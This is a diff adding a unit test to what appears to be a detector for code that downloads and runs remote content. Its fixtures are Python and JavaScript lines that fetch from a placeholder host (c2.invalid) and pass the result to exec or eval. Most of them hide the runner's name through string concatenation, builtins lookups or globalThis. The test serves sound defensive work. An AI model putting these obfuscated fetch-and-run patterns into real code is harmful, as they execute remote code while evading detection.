@@ -374,6 +374,31 @@ class ReceivedCodeFormsTests(unittest.TestCase):
                 self.assertEqual(core._received_code_kind(text), want)
         self.assertIsNone(core._received_code_kind("import requests\nx = getattr(requests, 'get')(u).text\nprint(x)\n"))
 
+    def test_member_names_the_file_builds(self):
+        """(the detection round) getattr's name in pieces or in a constant;
+        a runner named through the builtins or the global object."""
+        u = "'https://c2.invalid/p'"
+        cases = [
+            ("import requests, builtins\ngetattr(builtins, 'ex' + \"ec\")(requests.get(" + u + ").text)\n", (2, "run")),
+            ("import requests, builtins\ngetattr(builtins, 'exec', None)(requests.get(" + u + ").text)\n", (2, "run")),
+            ("import requests\nN = 'ev' + 'al'\ngetattr(__builtins__, N)(requests.get(" + u + ").text)\n", (3, "run")),
+            ("import requests\nH = 'ex'\ngetattr(__builtins__, H + 'ec')(requests.get(" + u + ").text)\n", (3, "run")),
+            ("import requests\n__builtins__.__dict__['exec'](requests.get(" + u + ").text)\n", (2, "run")),
+            ("fetch(" + u + ").then((r) => r.text()).then((c) => globalThis['eval'](c));\n", (1, "run")),
+            ("fetch(" + u + ").then((r) => r.text()).then((c) => window.Function(c)());\n", (1, "run")),
+        ]
+        for text, want in cases:
+            with self.subTest(text.split("\n")[1][:50]):
+                self.assertEqual(core._received_code_kind(text), want)
+        for text in ("import requests\nN = 'exec'\nN = 'print'\ngetattr(__builtins__, N)(requests.get(" + u + ").text)\n",
+                     "import requests\nN = 'ex'\nN += 'ec'\ngetattr(__builtins__, N)(requests.get(" + u + ").text)\n",
+                     "import requests\ndef f(n):\n    getattr(__builtins__, n)(requests.get(" + u + ").text)\n",
+                     "import requests\ngetattr(__builtins__, 'ex' + 'e-c')(requests.get(" + u + ").text)\n",
+                     "import requests, builtins\nbuiltins.execute(requests.get(" + u + ").text)\n",
+                     "fetch(" + u + ").then((r) => r.text()).then((c) => myglobal.eval(c));\n"):
+            with self.subTest(text.split("\n")[1][:50]):
+                self.assertIsNone(core._received_code_kind(text))
+
     def test_a_runner_handed_to_a_call(self):
         """p.then(eval), res.on('data', eval): the runner is called with what the call hands it."""
         cases = [
